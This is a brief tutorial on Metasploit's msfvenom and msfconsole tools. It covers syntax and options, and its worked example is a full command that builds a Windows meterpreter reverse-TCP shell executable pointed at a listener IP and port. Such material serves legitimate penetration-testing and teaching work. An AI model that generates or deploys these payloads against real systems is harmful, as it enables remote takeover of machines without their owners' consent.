msfvenom
--------
msfvenom is a command-line tool within the Metasploit framework that allows you to generate various types of 
payloads for use in exploits. These payloads are designed to be executed on the target system after a successful 
exploitation.

SYNTAX
------
msfvenom -p [Payload] [Options] -f [Format] -o [Output_File]

-p [Payload]: Specifies the payload you want to generate. Payloads are the pieces of code that will be executed on the target system after exploitation. Examples of payload types include reverse shells, meterpreter payloads, shellcodes, and more.

[Options]: These are the various options you can set to customize the generated payload. The available options depend on the selected payload type. You can use the `-h` flag after specifying the payload to see a list of available options and their descriptions.

-f [Format]: Specifies the format in which you want the payload to be generated. Common formats include exe, elf, raw, and more. The available formats also depend on the selected payload type.

-o [Output_File]: Specifies the name of the file where the generated payload will be saved.

Here's a simplified example of generating a basic Windows reverse shell payload:

EXAMPLE
-------
=> msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o reverse_shell.exe


In this example:
- `-p windows/meterpreter/reverse_tcp`: Specifies the payload type as a Windows meterpreter reverse TCP shell.
- `LHOST=192.168.1.100`: Sets the IP address of the listener (your machine).
- `LPORT=4444`: Sets the port number on which the listener will be running.
- `-f exe`: Specifies that the output format should be an executable file.
- `-o reverse_shell.exe`: Specifies the output file name as `reverse_shell.exe`.

Keep in mind that the options and payload types available in `msfvenom` can change based on the version of 
Metasploit and the modules installed. Always refer to the Metasploit documentation and help messages 
(`msfvenom -h`) for the most up-to-date information and options for generating payloads.

msfconsole
----------
SYNTAX
------
=> msfconsole [Options]

[Options]: These are additional flags you can use to configure the behavior of the msfconsole.

-q or --quiet: Run in quiet mode, suppressing banner and startup messages.
-r [Script_File]: Load and execute commands from a specified script file.
-x [Command]: Execute a single command and then exit.
--version: Display the Metasploit version information and exit.
--help: Display help information about the available options.


Once you start the msfconsole, you'll be presented with an interactive command-line interface where you can enter 
various commands to interact with the framework. Here are a few essential commands to get you started:

help: Display a list of available commands and their descriptions.
show [module_type]: List available modules of the specified type (e.g., exploits, payloads, auxiliary).
use [module_path]: Select a module for use and prepare it for configuration.
search [keyword]: Search for modules containing the specified keyword in their names or descriptions.
info [module_path]: Display detailed information about the selected module.
set [option] [value]: Set options for the selected module.
run or exploit: Execute the selected module with the configured options.
sessions: List active sessions established with exploited targets.
exit or quit: Exit the msfconsole.
